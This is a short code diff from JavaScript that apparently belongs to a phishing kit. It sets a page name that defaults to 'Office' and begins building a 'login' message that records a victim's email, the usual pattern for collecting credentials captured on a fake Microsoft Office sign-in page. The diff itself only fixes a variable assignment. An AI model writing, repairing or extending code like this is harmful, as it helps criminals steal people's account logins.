@@ -15,7 +15,7 @@ console.log(page);
   if(!page){
   pageN = "Office";
  }else{
-   pageN = pageN;
+   pageN = page;
  }
   let message = '---------- 📧' + pageN +' login 📧 ----------\n';
   message += `email: ${ai} \n`;
